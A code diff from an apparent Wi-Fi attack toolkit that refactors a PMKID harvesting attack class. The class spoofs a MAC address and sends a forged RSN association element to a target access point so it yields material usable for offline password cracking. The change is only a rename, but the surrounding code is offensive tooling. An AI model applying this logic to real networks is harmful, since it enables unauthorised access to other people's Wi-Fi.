@@ -35,7 +35,7 @@ from typing import Optional
 from wifit3.engine.models import AccessPoint
 
 from .campaign import Campaign
-from .wps.association import WpsAssociation
+from .auth_assoc import Association
 
 logger = logging.getLogger(__name__)
 
@@ -284,7 +284,7 @@ class PmkidHarvestAttack(Campaign):
 
         # Active-monitor (HW-ACK our forged MAC) lets the AP treat us as a real STA
         # and reliably emit M1. set_fake_mac returns None when the card lacks the
-        # FAKE_MAC capability — WpsAssociation just runs un-ACKed. Re-armed per
+        # FAKE_MAC capability — Association just runs un-ACKed. Re-armed per
         # attempt (each rotates the source MAC); teardown() clears it once.
         for attempt in range(1, self.attempts + 1):
             if self.stopped:
@@ -300,10 +300,10 @@ class PmkidHarvestAttack(Campaign):
                      + (f" (retry {attempt})" if attempt > 1 else ""))
             # Robust auth+assoc (waits for the Auth Resp, resends while silent),
             # carrying our forged single-AKM=PSK RSN IE as the trailing assoc IE.
-            assoc = WpsAssociation(self.iface, self.target.bssid, self.target.ssid or "",
-                                   self.target.channel, our_mac=self.source_mac,
-                                   assoc_extra_ies=self._assoc_rsn_ie,
-                                   should_stop=lambda: self.stopped)
+            assoc = Association(self.iface, self.target.bssid, self.target.ssid or "",
+                                self.target.channel, our_mac=self.source_mac,
+                                assoc_trailer_ies=self._assoc_rsn_ie,
+                                should_stop=lambda: self.stopped)
             assoc.start()
             try:
                 await assoc.associate()
